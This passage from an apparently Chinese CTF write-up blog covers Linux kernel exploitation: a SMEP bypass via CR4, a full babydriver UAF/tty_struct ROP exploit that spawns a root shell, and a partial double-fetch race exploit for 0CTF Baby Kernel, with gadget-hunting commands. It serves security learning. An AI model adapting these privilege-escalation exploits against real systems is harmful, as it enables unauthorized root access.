class="hljs-number">18</span>] = user_ss;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">copy_func</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] copy from user with size: %ld\n&quot;</span>, size);<br>    ioctl(proc_fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    proc_fd = open(PROC_PATH, O_RDWR);<br>    <span class="hljs-keyword">if</span> (proc_fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Error on opening %s!&quot;</span>, PROC_PATH);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;test string&quot;</span>);<br>    parse_kallsyms();<br>    get_canary();<br><br>    save_context();<br>    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">40</span>];<br>    set_rop(rop);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> DEBUG</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] DEBUG&quot;</span>);<br>    getchar();<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    write(proc_fd, rop, <span class="hljs-number">40</span> * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">size_t</span>));<br>    copy_func(<span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_context</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_rsp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_eflags;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="BYPASS-SMEP"><a href="#BYPASS-SMEP" class="headerlink" title="BYPASS-SMEP"></a>BYPASS-SMEP</h3><blockquote><p>check whether the smep is enabled.</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">grep smep /proc/cpuinfo<br></code></pre></div></td></tr></table></figure><h4 id="smep-和-CR4-寄存器"><a href="#smep-和-CR4-寄存器" class="headerlink" title="smep 和 CR4 寄存器"></a>smep 和 CR4 寄存器</h4><p>系统根据 CR4 寄存器的值判断是否开启 smep 保护，当 CR4 寄存器的第 20 位是 1 时，保护开启；是 0 时，保护关闭。</p><img src="../../image/CTF_newly_start/smep.jpg" alt="smep" style="zoom:80%;" /><p>例如，当</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">$CR4 = 0x1407f0 = 000 1 0100 0000 0111 1111 0000<br></code></pre></div></td></tr></table></figure><p>时，smep 保护开启。而 CR4 寄存器是可以通过 mov 指令修改的，因此只需要</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs assembly">mov cr4, 0x1407e0<br># 0x1407e0 = 101 0 0000 0011 1111 00000<br></code></pre></div></td></tr></table></figure><p>即可关闭 smep 保</p><p>搜索一下从 <code>vmlinux</code> 中提取出的 gadget，很容易就能达到这个目的。</p><p>如何查看 CR4 寄存器的值？</p><ul><li>gdb 无法查看 cr4 寄存器的值，可以通过 kernel crash 时的信息查看。为了关闭 smep 保护，常用一个固定值 <code>0x6f0</code>，即 <code>mov cr4, 0x6f0</code>。</li></ul></blockquote><h4 id="CISCN2017-babydriver"><a href="#CISCN2017-babydriver" class="headerlink" title="CISCN2017 - babydriver"></a>CISCN2017 - babydriver</h4><p>是之前的UAF的那一题的另一种做法. </p><p>没有提供vmlinux(内核镜像), 唯一的bzImage是已压缩的镜像文件, extract_vmlinux脚本实际上就是用了最基础的sh shell加上尝试一堆解压命令, 哪一个能用就把他解压出来到tmp文件夹下, 经过check后把tmp中解压后的文件cat到stdout. </p><p>可以使用下面这一条命令解压出vmlinux: </p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></div></td></tr></table></figure><p>没有开kaslr, .ko固定在81000的位置. 所要的地址可以直接硬编码.</p><p>后续详见WiKi. 就是想UAFN那题一样重新打开文件来控制一个tty结构体. 修改函数指针</p><p><b style='color:red;background:yellow'>然后再仔细看了看, 果然又是一堆没注意到的细节…..</b> </p><p>exp如下:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span><br><br><span class="hljs-keyword">void</span>* fake_tty_operations[<span class="hljs-number">30</span>];<br><br><span class="hljs-keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">save_status</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]status has been saved.&quot;</span>);<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_shell</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">get_root</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span>* (*pkc)(<span class="hljs-keyword">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-keyword">void</span> (*cc)(<span class="hljs-keyword">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    save_status();<br><br>    <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">size_t</span> rop[<span class="hljs-number">32</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    rop[i++] = <span class="hljs-number">0xffffffff810d238d</span>;      <span class="hljs-comment">// pop rdi; ret;</span><br>    rop[i++] = <span class="hljs-number">0x6f0</span>;<br>    rop[i++] = <span class="hljs-number">0xffffffff81004d80</span>;      <span class="hljs-comment">// mov cr4, rdi; pop rbp; ret;</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_root;<br>    rop[i++] = <span class="hljs-number">0xffffffff81063694</span>;      <span class="hljs-comment">// swapgs; pop rbp; ret;</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = <span class="hljs-number">0xffffffff814e35ef</span>;      <span class="hljs-comment">// iretq; ret;</span><br>    rop[i++] = (<span class="hljs-keyword">size_t</span>)get_shell;<br>    rop[i++] = user_cs;                <span class="hljs-comment">/* saved CS */</span><br>    rop[i++] = user_rflags;            <span class="hljs-comment">/* saved EFLAGS */</span><br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">30</span>; i++)<br>    &#123;    <span class="hljs-comment">//其实就是个填充, 只有write函数有用到第8个, 为了方便全部填成一样的.</span><br>        fake_tty_operations[i] = <span class="hljs-number">0xFFFFFFFF8181BFC5</span>; <span class="hljs-comment">// mov rsp,rax ; dec ebx ; ret</span><br>    &#125;<br>    fake_tty_operations[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffff810635f5</span>;  <span class="hljs-comment">//pop rax; pop rbp; ret;</span><br>    fake_tty_operations[<span class="hljs-number">1</span>] = (<span class="hljs-keyword">size_t</span>)rop;<br>    <span class="hljs-comment">//fake_tty_operations[3] = 0xFFFFFFFF8181BFC5;  // mov rsp,rax ; dec ebx ; ret</span><br><br>    <span class="hljs-keyword">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, O_RDWR);<br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>    close(fd1);<br><br>    <span class="hljs-keyword">int</span> fd_tty = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY);<br>    <span class="hljs-keyword">size_t</span> fake_tty_struct[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    read(fd2, fake_tty_struct, <span class="hljs-number">32</span>);<br>    fake_tty_struct[<span class="hljs-number">3</span>] = (<span class="hljs-keyword">size_t</span>)fake_tty_operations;<br>    write(fd2,fake_tty_struct, <span class="hljs-number">32</span>);<br><br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x8</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    write(fd_tty, buf, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p><code>fake_tty_struct</code>中的第四个就是ops的函数指针数组, 把构造好的<code>fake_tty_operations</code>地址填到里面即可. </p><p>然后就是ops的构造. 首先要看内核是如何调用ops的:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">  0xffffffff814dc0b6    mov    rax, qword ptr [rbx + 0x18]<br>  0xffffffff814dc0ba    mov    edx, r12d<br>  0xffffffff814dc0bd    mov    rsi, r13<br>  0xffffffff814dc0c0    mov    rdi, rbx<br>► 0xffffffff814dc0c3    call   qword ptr [rax + 0x38]<br><br>  0xffffffff814dc0c6    mov    rdi, r14<br>  0xffffffff814dc0c9    mov    r15d, eax<br>  0xffffffff814dc0cc    call   0xffffffff81817ae0<br></code></pre></div></td></tr></table></figure><p>有标记的一行就是对函数指针的使用, 可以看到这里用了rax来存指针数组的基址, 所以在gadget中可以使用<code>mov rsp, rax; ret</code> 这种gadget. 但是这特么也太难找了, exp里面用的那个是<code>mov rsp, rax; dec rbx; jmp -&gt; ret</code>的组合, 没有哪个工具会自动搜索到这个gadget, 只能把所有的gadget找出来然后再输出文件中搜索. 比如下面这样:</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ROPgadget --binary vmlinux &gt; gadget</span><br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-keyword">in</span> gadget</span><br>...<br>459047 0xffffffff8181bfc5 : mov rsp, rax ; dec ebx ; jmp 0xffffffff8181bf7e<br>...<br><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-keyword">in</span> ropper interactive console</span><br><span class="hljs-meta">(vmlinux/ELF/x86_64)&gt;</span><span class="bash"> disasm_address 0xffffffff8181bf7e</span><br>Instructions<br>============<br>0xffffffff8161bf7e: ret<br></code></pre></div></td></tr></table></figure><p>这样才算是找到了一个. </p><blockquote><p>如果要dump指定的地址, 我看最方便的还是把整个vmlinux都反汇编出来, ropper加载还是挺慢的(一次直接把3G内存吃没了, 绝). 我还是用ROPgadget吧, ropper搜半天还会卡住. 搜完之后一个文件44M, 真的大.</p></blockquote><p><strong>因为这里没有write漏洞可以利用, 那么最终的目的就是将rsp改为rop指针的值, 所以就要重复修改rsp</strong>:</p><p>第一次执行完ops中的<code>write</code>之后此时的rsp就指向了指针数组的开头, 我们填入的0 1 <del>3</del>号就是从栈顶开始计数的QWORD区域(3号可以去掉, 除了提示没有作用), 然后再通过:</p><ul><li><code>pop rax; pop rbp; ret</code>: rax = rop</li><li><code>mov rsp, rax; dec rbx; jmp ???; ret</code>: rsp = rop; bingo</li></ul><p>现在rsp已定位到rop指向的fake stack上, 可以顺利进行rop了.</p><blockquote><p>写了几行自动反汇编指定地址的shell, 放在pwnsh里面. vmlinux-disasm</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/bin/bash</span><br>vm=./vmlinux<br>if [ ! -e $vm ]; then<br>    echo vmlinux not Exits!<br>    exit 1<br>fi<br>realpath $vm<br>len=30<br>if [ $# -eq 0 ]; then<br>    echo &#x27;Need Address Argument!&#x27;<br>    exit 1<br>fi<br>if [ $2 ]; then<br>    len=$2<br>fi<br>objdump $vm -d -Mintel --start-address=$1 --stop-address=$(printf 0x%x $(($1+$len))) <br></code></pre></div></td></tr></table></figure></blockquote><h3 id="Double-Fetch"><a href="#Double-Fetch" class="headerlink" title="Double Fetch"></a>Double Fetch</h3><h4 id="2018-0CTF-Finals-Baby-Kernel"><a href="#2018-0CTF-Finals-Baby-Kernel" class="headerlink" title="2018 0CTF Finals Baby Kernel"></a>2018 0CTF Finals Baby Kernel</h4><p><em><strong>USING RACE CONDITION</strong></em> :</p><p>这题的init调用了<code>misc_register()</code>, 作用: Register a miscellaneous device with the kernel. 所以这个设备会在/dev下, 名称为baby.</p><p>驱动主要注册了一个 <code>baby_ioctl</code> 函数，其中包含两个功能。当 ioctl 中 cmd 参数为 0x6666 时，驱动将输出 flag 的加载地址。当 ioctl 中 cmd 参数为 0x1337 时，首先进行三个校验，接着对用户输入的内容与硬编码的 flag 进行逐字节比较，当一致时通过 <code>printk</code> 将 flag 输出出来。</p><p>而分析其检查函数，其中 <code>_chk_range_not_ok</code> 为检查指针及长度范围是否指向用户空间。通过对驱动文件功能的分析，可以得到用户输入的数据结构体如下：</p><figure class="highlight basic"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">00000000 </span>attr            struc ; (sizeof=<span class="hljs-number">0</span>x10, mappedto_3)<br><span class="hljs-symbol">00000000 </span>flag_str        dq ?<br><span class="hljs-symbol">00000008 </span>flag_len        dq ?<br><span class="hljs-symbol">00000010 </span>attr            ends<br></code></pre></div></td></tr></table></figure><p>其检查内容为：</p><ol><li>输入的数据指针是否为用户态数据。</li><li>数据指针内 flag_str 是否指向用户态。</li><li>据指针内 flag_len 是否等于硬编码 flag 的长度。长度通过IDA查看后数出来是33.</li></ol><blockquote><p>关于检查用户区指针函数:</p><p>函数的反编译代码为: <code>!_chk_range_not_ok(a3, 16LL, *(_QWORD *)(__readgsqword((unsigned int)&amp;current_task) + 0x1358))</code>, 这一条是检查传入ioctl的指针是否指向用户区, 下面解释一下第三个参数是怎么回事.</p><p>在内核中也有一个检查是否是用户区指针的函数, 首先是一个宏定义: <code>#define access_ok(addr, size)</code>, 然后调用了<br><code>likely(__access_ok(addr, size));</code>, 重点就在__access_ok这个函数上(in <code>/include/asm-generic/access_ok.h</code>) :</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * &#x27;size&#x27; is a compile-time constant for most callers, so optimize for</span><br><span class="hljs-comment"> * this case to turn the check into a single comparison against a constant</span><br><span class="hljs-comment"> * limit and catch all possible overflows.</span><br><span class="hljs-comment"> * On architectures with separate user address space (m68k, s390, parisc,</span><br><span class="hljs-comment"> * sparc64) or those without an MMU, this should always return true.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * This version was originally contributed by Jonas Bonn for the</span><br><span class="hljs-comment"> * OpenRISC architecture, and was found to be the most efficient</span><br><span class="hljs-comment"> * for constant &#x27;size&#x27; and &#x27;limit&#x27; values.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-keyword">int</span> __access_ok(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> __user *ptr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> size)<br>&#123;<br>    <span class="hljs-comment">//TASK_SIZE really is a mis-named.  It really is the maximum user</span><br>    <span class="hljs-comment">//space address (plus one).</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> limit = TASK_SIZE_MAX;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> addr = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)ptr;<br><br>    <span class="hljs-keyword">if</span> (IS_ENABLED(CONFIG_ALTERNATE_USER_ADDRESS_SPACE) ||<br>        !IS_ENABLED(CONFIG_MMU))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">return</span> (size &lt;= limit) &amp;&amp; (addr &lt;= (limit - size));<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这里的<code>TASK_SIZE_MAX</code>-&gt;<code>TASK_SIZE</code>-&gt;<code>DEFAULT_TASK_SIZE</code>-&gt;user space address + 1 = <code>0xa000000000000000</code> </p><p>至于为什么是current_task + 0x1358没有查到, 至少在运行时刻他的值为<code>0x7ffffffff000</code>, 即用户空间的上限.</p></blockquote><p>检查时要求指向用户区, 进入if语句后检查内容是否和flag一致. 那么在这之间可以用另外一个线程来制造竞态条件, 修改指针为内核空间中的flag, 这样比较两个相同的东西肯定是能通过的.</p><p>第一版:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-keyword">size_t</span> flag_kaddr = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">char</span> *prefix = <span class="hljs-string">&quot;Your flag is at &quot;</span>;<br><span class="hljs-keyword">char</span> *fake_flag = <span class="hljs-string">&quot;0123456789&quot;</span><br>                  <span class="hljs-string">&quot;0123456789&quot;</span><br>                  <span class="hljs-string">&quot;0123456789&quot;</span><br>                  <span class="hljs-string">&quot;012&quot;</span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> TRY_TIME 8000</span><br><span class="hljs-keyword">u_int8_t</span> flag_finish;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">ATTR_t</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-keyword">char</span> *buf;<br>    <span class="hljs-keyword">size_t</span> len;<br>&#125; attr;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">race_condition</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">while</span> (flag_finish == <span class="hljs-number">0</span>)<br>        attr.buf = (<span class="hljs-keyword">char</span> *)flag_kaddr;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// ioctl to get flag address</span><br>    setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">int</span> baby_fd = open(<span class="hljs-string">&quot;/dev/baby&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (baby_fd == <span class="hljs-number">-1</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;open /dev/baby fail!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    ioctl(baby_fd, <span class="hljs-number">0x6666</span>, <span class="hljs-literal">NULL</span>);<br>    system(<span class="hljs-string">&quot;dmesg &gt; /tmp/mesg&quot;</span>);<br>    FILE *tmp_fd = fopen(<span class="hljs-string">&quot;/tmp/mesg&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">char</span> buf[<span class="hljs-number">101</span>];<br>    <span class="hljs-keyword">while</span> (fgets(buf, <span class="hljs-number">100</span>, tmp_fd))<br>    &#123;<br>        <span class="hljs-keyword">char</span> *pos;<br>        <span class="hljs-keyword">if</span> (pos = <span class="hljs-built_in">strstr</span>(buf, prefix))<br>            flag_kaddr = strtoull(pos + <span class="hljs-built_in">strlen</span>(prefix), <span class="hljs-literal">NULL</span>, <span class="hljs-number">16</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the address of flag_kaddr is %p\n&quot;</span>, flag_kaddr);<br>    <span class="hljs-comment">// create new thread to modify attr.flag to kernel flag addr</span><br>    <span class="hljs-comment">// init attr struct</span><br>    attr.buf = (<span class="hljs-keyword">char</span> *)fake_flag;<br>    attr.len = <span 